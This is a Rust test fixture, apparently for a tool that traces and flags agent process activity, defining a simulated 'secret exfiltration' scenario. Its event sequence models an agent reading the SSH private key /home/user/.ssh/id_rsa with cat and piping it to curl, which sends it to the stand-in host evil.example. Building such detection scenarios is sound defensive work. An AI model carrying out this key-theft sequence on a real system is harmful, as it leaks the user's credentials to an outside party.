use crate::events::{Endpoint, Event, Fd, PipeId, ProcessId, StartTime, Timestamp};

use super::Scenario;

pub fn secret_exfil(secret_len: usize) -> Scenario {
    let cat = ProcessId::new(800, StartTime(7_000));
    let curl = ProcessId::new(801, StartTime(7_010));
    let endpoint = Endpoint::tcp("evil.example", 443);

    Scenario::new(
        "demo_secret_exfil",
        vec![
            Event::AgentLaunch {
                process: cat.clone(),
                command: vec!["cat".into(), "/home/user/.ssh/id_rsa".into()],
                at: Timestamp(1),
            },
            Event::Pipe {
                process: cat.clone(),
                pipe: PipeId(10),
                read_fd: Fd(4),
                write_fd: Fd(5),
                at: Timestamp(2),
            },
            Event::Fork {
                parent: cat.clone(),
                child: curl.clone(),
                at: Timestamp(3),
            },
            Event::Dup {
                process: curl.clone(),
                from_fd: Fd(4),
                to_fd: Fd(0),
                at: Timestamp(4),
            },
            Event::Open {
                process: cat.clone(),
                fd: Fd(3),
                path: "/home/user/.ssh/id_rsa".into(),
                at: Timestamp(5),
            },
            Event::Read {
                process: cat.clone(),
                fd: Fd(3),
                len: secret_len,
                at: Timestamp(6),
            },
            Event::Write {
                process: cat.clone(),
                fd: Fd(5),
                len: secret_len,
                at: Timestamp(7),
            },
            Event::Read {
                process: curl.clone(),
                fd: Fd(0),
                len: secret_len,
                at: Timestamp(8),
            },
            Event::Connect {
                process: curl.clone(),
                fd: Fd(6),
                endpoint,
                at: Timestamp(9),
            },
            Event::Send {
                process: curl,
                fd: Fd(6),
                len: secret_len,
                at: Timestamp(10),
            },
        ],
    )
}
